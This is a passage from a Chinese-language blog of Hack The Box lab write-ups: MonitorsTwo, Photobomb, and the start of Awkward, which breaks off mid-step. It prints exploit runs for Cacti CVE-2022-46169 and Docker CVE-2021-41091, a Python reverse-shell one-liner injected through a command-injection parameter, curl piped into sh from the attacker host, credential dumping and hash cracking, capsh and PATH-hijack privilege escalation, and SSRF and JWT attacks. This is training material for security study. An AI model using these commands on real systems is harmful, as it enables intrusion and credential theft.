OS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 199/tcp) HOP RTT ADDRESS 1 149.95 ms 10.10.16.1 2 193.70 ms 10.10.11.211 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35.93 seconds Http 通过 http 页面得至该 cms 为 Cacti 1.2.22 ，去搜索一下看看有没有漏洞 找到一个 CVE-2022-46169 ，下载下来使用 https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22 漏洞利用使用 nc 开启一个端口监听 nc -nvlp 4444 然后执行 exp ┌──(root㉿kali)-[~/Desktop/CVE-2022-46169-CACTI-1.2.22] └─# python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.16.23 --LPORT=4444 Checking... The target is vulnerable. Exploiting... Bruteforcing the host_id and local_data_ids Bruteforce Success!! ┌──(root㉿kali)-[~/Desktop] └─# rlwrap nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.23] from (UNKNOWN) [10.10.11.211] 38920 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell bash-5.1$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功得到一个 shell 权限提升Userbash-5.1$ cd / cd / bash-5.1$ ls -la ls -la total 88 drwxr-xr-x 1 root root 4096 Mar 21 10:49 . drwxr-xr-x 1 root root 4096 Mar 21 10:49 .. -rwxr-xr-x 1 root root 0 Mar 21 10:49 .dockerenv drwxr-xr-x 1 root root 4096 Mar 22 13:21 bin drwxr-xr-x 2 root root 4096 Mar 22 13:21 boot drwxr-xr-x 5 root root 340 May 7 22:45 dev -rw-r--r-- 1 root root 648 Jan 5 11:37 entrypoint.sh drwxr-xr-x 1 root root 4096 Mar 21 10:49 etc drwxr-xr-x 2 root root 4096 Mar 22 13:21 home drwxr-xr-x 1 root root 4096 Nov 15 04:13 lib drwxr-xr-x 2 root root 4096 Mar 22 13:21 lib64 drwxr-xr-x 2 root root 4096 Mar 22 13:21 media drwxr-xr-x 2 root root 4096 Mar 22 13:21 mnt drwxr-xr-x 2 root root 4096 Mar 22 13:21 opt dr-xr-xr-x 274 root root 0 May 7 22:45 proc drwx------ 1 root root 4096 Mar 21 10:50 root drwxr-xr-x 1 root root 4096 Nov 15 04:17 run drwxr-xr-x 1 root root 4096 Jan 9 09:30 sbin drwxr-xr-x 2 root root 4096 Mar 22 13:21 srv dr-xr-xr-x 13 root root 0 May 7 22:45 sys drwxrwxrwt 1 root root 4096 May 7 23:08 tmp drwxr-xr-x 1 root root 4096 Nov 14 00:00 usr drwxr-xr-x 1 root root 4096 Nov 15 04:13 var 首先前往根目录，看到一个脚本 entrypoint.sh ，并且看到一个 .dockerenv ，怀疑我们当前环境在 docker 容器里 查看一下脚本的内容 bash-5.1$ cat entrypoint.sh cat entrypoint.sh #!/bin/bash set -ex wait-for-it db:3306 -t 300 -- echo &quot;database is connected&quot; if [[ ! $(mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;) =~ &quot;automation_devices&quot; ]]; then mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql mysql --host=db --user=root --password=root cacti -e &quot;UPDATE user_auth SET must_change_password=&#39;&#39; WHERE username = &#39;admin&#39;&quot; mysql --host=db --user=root --password=root cacti -e &quot;SET GLOBAL time_zone = &#39;UTC&#39;&quot; fi chown www-data:www-data -R /var/www/html # first arg is `-f` or `--some-option` if [ &quot;${1#-}&quot; != &quot;$1&quot; ]; then set -- apache2-foreground &quot;$@&quot; fi exec &quot;$@&quot; 这里可以看到 mysql 的链接地址和登录凭据 构造一下 mysql 语句 mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot; mysql --host=db --user=root --password=root cacti -e &quot;select * from user_auth&quot; admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 得到了两个 hash 值 John使用 John 进行爆破 ┌──(root㉿kali)-[~/Desktop] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash marcus:funkymonkey 1 password hash cracked, 0 left 爆破出来了一个账号密码，使用 ssh 进行登录 ┌──(root㉿kali)-[~/Desktop] └─# ssh marcus@10.10.11.211 marcus@10.10.11.211&#39;s password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 07 May 2023 11:50:19 PM UTC System load: 0.0 Usage of /: 63.1% of 6.73GB Memory usage: 12% Swap usage: 0% Processes: 227 Users logged in: 0 IPv4 address for br-60ea49c21773: 172.18.0.1 IPv4 address for br-7c3b7c0d00b3: 172.19.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.211 IPv6 address for eth0: dead:beef::250:56ff:feb9:74e1 Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update You have mail. Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40 marcus@monitorstwo:~$ whoami&amp;&amp;id marcus uid=1000(marcus) gid=1000(marcus) groups=1000(marcus) marcus@monitorstwo:~$ ls user.txt marcus@monitorstwo:~$ cat user.txt 2df2af6924e2b749d747ce39010753e5 成功拿到 user 权限的 flag 文件 Root在登录 Marcus 的时候，提示我们有一封邮件，去查看一下 marcus@monitorstwo:~$ cat /var/mail/marcus From: administrator@monitorstwo.htb To: all@monitorstwo.htb Subject: Security Bulletin - Three Vulnerabilities to be Aware Of Dear all, We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible. CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability. CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability. CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed. We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department. Best regards, Administrator CISO Monitor Two Security Team 这里提到了三个 CVE 漏洞，按照情况分析，应该是第三个 CVE-2021-41091 https://github.com/UncleJ4ck/CVE-2021-41091 该漏洞利用有三个步骤 在 docker 容器中获得 root 权限 在 docker 容器中使用 chmod u+s /bin/bash 设置 /bin/bash 的权限 执行 poc 现在来进行利用 Step 1www-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null /usr/bin/gpasswd /usr/bin/passwd /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /sbin/capsh /bin/mount /bin/umount /bin/su 查找可以执行的文件 发现一个可疑的 /sbin/capsh https://gtfobins.github.io/gtfobins/capsh/ 找到了关于 capsh 的提权提示 www-data@50bca5e748b0:/var/www/html$ /sbin/capsh --gid=0 --uid=0 -- /sbin/capsh --gid=0 --uid=0 -- whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),33(www-data) 成功提权到 root Step 2chmod u+s /bin/bash ls -la /bin/bash -rwsr-xr-x 1 root root 1234376 Mar 27 2022 /bin/bash 给 /bin/bash 添加上 s 权限 Step 3marcus@monitorstwo:~$ ./exp.sh [!] Vulnerable to CVE-2021-41091 [!] Now connect to your Docker container that is accessible and obtain root access ! [&gt;] After gaining root access execute this command (chmod u+s /bin/bash) Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes [!] Available Overlay2 Filesystems: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged [!] Iterating over the available Overlay2 filesystems ! [?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged [x] Could not get root access in &#39;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged&#39; [?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged [!] Rooted ! [&gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged [?] If it didn&#39;t spawn a shell go to this path and execute &#39;./bin/bash -p&#39; [!] Spawning Shell bash-5.1# exit 执行 exp，成功获取到了容器所在的地址 marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p bash-5.1# whoami&amp;&amp;id root uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus) 成功提权到 root bash-5.1# cat /root/root.txt 45e2b87e322ce4ea1ae7f141fd210579 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Photobomb - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Photobomb","date":"2023-05-07T11:38:36.000Z","updated":"2023-06-13T03:48:46.000Z","comments":true,"path":"2023/05/07/Hackthebox/Easy/Hackthebox-Photobomb/","link":"","permalink":"http://www.lucifiel.com/2023/05/07/Hackthebox/Easy/Hackthebox-Photobomb/","excerpt":"","text":"Hackthebox Photobomb靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.182 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-20 23:49 EST Nmap scan report for 10.10.11.182 Host is up (0.26s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e22473bbfbdf5cb520b66876748ab58d (RSA) | 256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA) |_ 256 20e05d8cba71f08c3a1819f24011d29e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://photobomb.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=12/20%OT=22%CT=1%CU=41677%PV=Y%DS=2%DC=T%G=Y%TM=63A290 OS:81%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SE OS:Q(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11NW7% OS:O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=FE88%W2 OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNS OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y% OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR% OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40% OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G% OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 275.46 ms 10.10.14.1 2 282.41 ms 10.10.11.182 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds Http 会被跳转到域名 photobomb.htb 去加入 hosts 解析 echo 10.10.11.182 photobomb.htb &gt;&gt; /etc/hosts 再访问一次就是正常的了 首页有个 click here，点击后会跳转登陆页面，去找一下密码 在 js 文件中发现一段 photobomb.js function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName(&#39;creds&#39;)[0].setAttribute(&#39;href&#39;,&#39;http://pH0t0:b0Mb!@photobomb.htb/printer&#39;); } } window.onload = init; 在里面找到了一段链接，里面应该就是账号密码了 登陆成功 他下面有个下载图片的功能，抓个包看看 确实是下载，但是这个参数看着很有搞头啊，这看着就是很明显的命令拼接执行 漏洞利用在 filetype 后面似乎可以拼接，但是没有回显，去开启一个 http 服务器试试 python3 -m http.server 80 photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg;curl+http://10.10.14.11&amp;dimensions=30x20 然后去请求一下 确实有回包，那就证明可以执行命令 export RHOST=&quot;10.10.14.11&quot;;export RPORT=4444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#39; 我们构造好 poc 以后，使用 nc 监听一个端口 nc -nvlp 4444 然后去 burp 中执行 export RHOST=&quot;10.10.14.11&quot;;export RPORT=4444;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#39; ┌──(root㉿kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.11] from (UNKNOWN) [10.10.11.182] 46772 wizard@photobomb:~/photobomb$ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; wizard@photobomb:~/photobomb$ whoami&amp;&amp;id whoami&amp;&amp;id wizard uid=1000(wizard) gid=1000(wizard) groups=1000(wizard) 成功弹回 shell wizard@photobomb:~$ cat user.txt cat user.txt 9ef16b54cbd2be4ef91cf67b6642e804 成功拿到 user 权限的 flag 文件 权限提升先跑个 linpeas 看看 curl -L http://10.10.14.11/linpeas.sh|sh wizard@photobomb:~$ sudo -l sudo -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wizard may run the following commands on photobomb: (root) SETENV: NOPASSWD: /opt/cleanup.sh 可以看到，我们可以无密码使用 root 权限执行 &#x2F;opt&#x2F;cleanup.sh，先去看看这个文件 #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ] then /bin/cat log/photobomb.log &gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name &#39;*.jpg&#39; -exec chown root:root {} \\; 对于这个文件，我们只有读取和写入权限，所以我们得先搞清楚他干了什么 大概看了一下，功能简单的说就是获取日志文件并将其内容移动到 photobonb.log.old，然后使用 truncate 清除 photobomb.log 这里的突破点在于最后一句，他的 find 命令使用的是相对路径，而不是绝对路径，我们就可以改变一下环境变量，然后在当前目录创建一个 find 文件，里面写一个恶意 poc，然后 sudo 执行的时候，就能直接获得我们想要的结果 echo &quot;/bin/bash&quot; &gt; find chmod +x find sudo PATH=$PWD:$PATH /opt/cleanup.sh wizard@photobomb:~$ echo &quot;/bin/bash&quot; &gt; find echo &quot;/bin/bash&quot; &gt; find wizard@photobomb:~$ chmod +x find chmod +x find wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh sudo PATH=$PWD:$PATH /opt/cleanup.sh root@photobomb:/home/wizard/photobomb# id id uid=0(root) gid=0(root) groups=0(root) root@photobomb:/home/wizard/photobomb# whoami whoami root 成功获得 root 权限 root@photobomb:/home/wizard/photobomb# cat /root/root.txt cat /root/root.txt aefec07aac4191d73f9f0e8dadd6ee58 成功获得 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Awkward - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Awkward","date":"2023-03-12T11:38:36.000Z","updated":"2023-06-13T03:40:11.000Z","comments":true,"path":"2023/03/12/Hackthebox/Medium/Hackthebox-Awkward/","link":"","permalink":"http://www.lucifiel.com/2023/03/12/Hackthebox/Medium/Hackthebox-Awkward/","excerpt":"","text":"Hackthebox - Awkward靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.11.185 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 01:55 CST Nmap scan report for 10.10.11.185 Host is up (0.083s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 7254afbaf6e2835941b7cd611c2f418b (ECDSA) |_ 256 59365bba3c7821e326b37d23605aec38 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: nginx/1.18.0 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=3/11%OT=22%CT=1%CU=37953%PV=Y%DS=2%DC=T%G=Y%TM=640B6F2 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1 OS:1NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 74.06 ms 10.10.16.1 2 75.37 ms 10.10.11.185 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.82 seconds Http这边 web 页面指向域名 hat-valley.htb ，去做一个 hosts 解析 echo 10.10.11.185 hat-valley.htb &gt;&gt; /etc/hosts 似乎是一个什么商城之类的，做找下有没有什么可用信息 Fuzz┌──(root㉿kali)-[~/Desktop] └─# ffuf -u &quot;http://hat-valley.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://hat-valley.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ css [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 404ms] static [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 386ms] js [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 356ms] [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 98ms] :: Progress: [30000/30000] :: Job [1/1] :: 743 req/sec :: Duration: [0:00:54] :: Errors: 2 :: 跑了一下目录，没什么有用的东西，去跑一下子域名 ┌──(root㉿kali)-[~/Desktop] └─# ffuf -H &quot;Host:FUZZ.hat-valley.htb&quot; -w &quot;/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt&quot; -u &quot;http://hat-valley.htb/&quot; -t 200 -fs 132 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://hat-valley.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.hat-valley.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 132 ________________________________________________ store [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 76ms] :: Progress: [114441/114441] :: Job [1/1] :: 2296 req/sec :: Duration: [0:00:49] :: Errors: 0 :: 发现一个子域名 store ，去加入一下 hosts 解析 echo 10.10.11.185 store.hat-valley.htb &gt;&gt; /etc/hosts 然后去访问一下 提示需要登录，尝试了一下弱口令没有成功，并且 fuzz 了一下也没有可以访问的地址，都是 401 把目光放回到主页面，我们继续 fuzz 下去 ┌──(root㉿kali)-[~/Desktop] └─# ffuf -u &quot;http://hat-valley.htb/js/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -e .js /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://hat-valley.htb/js/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Extensions : .js :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ app [Status: 200, Size: 150, Words: 6, Lines: 1, Duration: 267ms] app.js [Status: 200, Size: 430202, Words: 15339, Lines: 1640, Duration: 175ms] custom.js [Status: 200, Size: 8618, Words: 865, Lines: 370, Duration: 135ms] custom [Status: 200, Size: 153, Words: 6, Lines: 1, Duration: 230ms] plugin [Status: 200, Size: 153, Words: 6, Lines: 1, Duration: 240ms] plugin.js [Status: 200, Size: 899759, Words: 60565, Lines: 18950, Duration: 135ms] [Status: 200, Size: 14351, Words: 1661, Lines: 366, Duration: 575ms] revolution [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 286ms] :: Progress: [60000/60000] :: Job [1/1] :: 564 req/sec :: Duration: [0:01:46] :: Errors: 4 :: 在 app.js 中找到了一个指向 hr 的地址，去访问一下 有一个登陆页面，但测试了一下弱口令没成功 漏洞利用寻找突破点 查看 Cookie 中，发现有一个 token 值是 guest，给它改成 admin 试试 就直接登录了 这里有个请假申请，但是点了没有反应？抓个包看看 直接 500 了 在这里发现了两个接口 api/store-status api/staff-details 分别去访问一下呢 似乎是 JWT 令牌的问题，而 JWT 令牌是必须登录后才有的，但我们现在是通过未授权访问（还是越权？）来进行登录的，所以没有 JWT 令牌。 所以我们现在去退出登录再访问这个页面试试看 我发现我的思路错了，退出登录后还是回有一个 cookie，所以直接删除 cookie 试试 所以我们直接得到了一些账号密码 使用 crack station 来进行破解 https://crackstation.net/ 得到了一个账号密码 username = christopher.jones password = chris123 然后我们去 hr 页面登录 登录成功 然后我们拿到了 JWT Token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4NTUxNDU3fQ.Baca0KhSUCTjcZiDINY0mVs1Tndg78RGwXWLMpwjuZ8 使用 jwt.io 访问，可以看到内容相当的简单 但是我在四个用户列表中没有看到什么明显的是管理员的东西 不过 Christine Wool 似乎是 CEO，但是 JWT 令牌伪造比较麻烦，而且我看了下靶场类型，偏向于 Custom Exploitation ，这看着很像是兔子洞 所以我们换个思路 来到首页，我们点击刷新，抓这个刷新的包看看 请求的包有点奇怪 这个包指向了子域名 store ok，这很明显是一个 SSRF 了，我们来 fuzz 一下 Fuzz┌──(root㉿kali)-[~/Desktop] └─# ffuf -u &#39;http://hat-valley.htb/api/store-status?url=&quot;http://localhost:FUZZ&quot;&#39; -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -fs 0 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://hat-valley.htb/api/store-status?url=&quot;http://localhost:FUZZ&quot; :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 0 ________________________________________________ 0080 [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 290ms] 3002 [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 142ms] 8080 [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 170ms] :: Progress: [10000/10000] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:49] :: Errors: 0 :: 这里的 3002 和 8080 都是我们没有见过的，比较奇怪的，并且有东西的 而 3002 的 size 居然有 77010 个，明显不对，我们去看一下 直接访问是空白的，我们加上双引号试试 nice，有东西了 发现个有趣的玩意儿，检索已登录用户的休假请求历史记录，这个接口是有 LFI 的。 JWT Token 利用这里的 awk 命令是传递用户变量的，我们可以通过控制它来达到利用的目的 我们需要将用户变量更改为 /etc/passwd user 变量的值是 JWT 令牌的用户名，为了让它成功利用，我们先去拿到 JWT Token 的密钥 首先将 token 保存到本地 ┌──(root㉿kali)-[~/Desktop] └─# cat jwt 